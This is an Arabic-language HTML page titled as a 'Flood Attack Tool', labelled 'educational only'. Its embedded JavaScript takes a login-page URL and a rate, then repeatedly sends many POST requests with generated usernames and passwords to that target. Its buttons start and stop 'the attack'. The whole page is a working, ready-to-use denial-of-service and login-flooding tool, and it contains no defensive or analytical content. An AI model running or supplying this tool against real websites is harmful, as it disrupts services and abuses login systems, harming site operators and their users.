<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>هجوم بسيط على موقع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
        }
        input, button {
            padding: 10px;
            font-size: 18px;
            margin: 10px;
            width: 300px;
        }
    </style>
</head>
<body>

    <h1>🔫 Flood Attack Tool (تعليمي فقط)</h1>
    <input type="text" id="targetUrl" placeholder="ضع رابط صفحة تسجيل الدخول هنا">
    <br>
    <input type="number" id="requestsPerSecond" placeholder="عدد الريكوستات في الثانية" value="50">
    <br>
    <button onclick="startFlood()">ابدأ الهجوم</button>
    <button onclick="stopFlood()">أوقف الهجوم</button>

    <script>
        let interval;
        let counter = 0;

        function startFlood() {
            const url = document.getElementById('targetUrl').value;
            const rps = parseInt(document.getElementById('requestsPerSecond').value) || 50;

            if (!url) {
                alert("رجاءً ضع رابط صحيح!");
                return;
            }

            console.log(`🚀 بدء الهجوم على ${url} مع ${rps} طلب بالثانية.`);

            interval = setInterval(() => {
                for (let i = 0; i < rps; i++) {
                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: `username=user${counter}&password=pass${counter}&submit=1`
                    }).then(() => {
                        console.log(`✅ طلب #${counter} تم إرساله`);
                    }).catch(() => {
                        console.error(`❌ فشل في طلب #${counter}`);
                    });
                    counter++;
                }
            }, 1000);
        }

        function stopFlood() {
            clearInterval(interval);
            console.log('🛑 تم إيقاف الهجوم.');
        }
    </script>

</body>
</html>
